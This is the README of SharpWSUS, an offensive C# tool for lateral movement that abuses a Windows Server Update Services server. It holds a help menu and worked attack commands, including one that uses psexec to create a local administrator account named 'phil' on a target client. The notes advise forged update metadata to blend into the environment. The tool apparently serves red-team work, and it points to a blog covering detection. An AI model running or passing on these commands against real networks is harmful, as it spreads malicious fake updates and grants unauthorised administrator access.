# SharpWSUS

SharpWSUS is a CSharp tool for lateral movement through WSUS. There is a corresponding blog (https://labs.nettitude.com/blog/introducing-sharpwsus/) which has more detailed information about the tooling, use case and detection.

## Credits 

Massive credit to the below resources that really did 90% of this for me. This tool is just an enhancement of the below for C2 reliability and flexibility.

* https://github.com/AlsidOfficial/WSUSpendu - powershell tool for abusing WSUS
* https://github.com/ThunderGunExpress/Thunder_Woosus - Csharp tool for abusing WSUS

## Building
This project requires .NET Framework v4.0. You can download that here: https://dotnet.microsoft.com/en-us/download/dotnet-framework/net40. It may work with newer versions of .NET, however, it's not been tested.

## Help Menu

```
 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team


Commands listed below have optional parameters in <>.

Locate the WSUS server:
    SharpWSUS.exe locate

Inspect the WSUS server, enumerating clients, servers and existing groups:
    SharpWSUS.exe inspect

Create an update (NOTE: The payload has to be a windows signed binary):
    SharpWSUS.exe create /payload:[File location] /args:[Args for payload] </title:[Update title] /date:[YYYY-MM-DD] /kb:[KB on update] /rating:[Rating of update] /msrc:[MSRC] /description:[description] /url:[url]>

Approve an update:
    SharpWSUS.exe approve /updateid:[UpdateGUID] /computername:[Computer to target] </groupname:[Group for computer to be added too] /approver:[Name of approver]>

Check status of an update:
    SharpWSUS.exe check /updateid:[UpdateGUID] /computername:[Target FQDN]

Delete update and clean up groups added:
    SharpWSUS.exe delete /updateid:[UpdateGUID] /computername:[Target FQDN] </groupname:[GroupName] /keepgroup>
```

## Example Usage

```
sharpwsus locate

sharpwsus inspect

sharpwsus create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \\"net user phil Password123! /add && net localgroup administrators phil /add\\"" /title:"Great UpdateC21" /date:2021-10-03 /kb:500123 /rating:Important /description:"Really important update" /url:"https://google.com"

sharpwsus approve /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:win10-client10.blorebank.local /groupname:"Awesome Group C2"

sharpwsus check /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:win10-client10.blorebank.local

sharpwsus delete /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:win10-client10.blorebank.local /groupname:"Awesome Group C2"
```

## Notes

* Binary has to be windows signed, so psexec, msiexec, msbuild etc could be useful for lateral movement.
* The metadata on the create command is not needed, but is useful for blending in to the environment.
* If testing in a lab the first is usually quick, then each subsequent update will take a couple hours (this is due to how windows evaluates whether an update is installed already or not)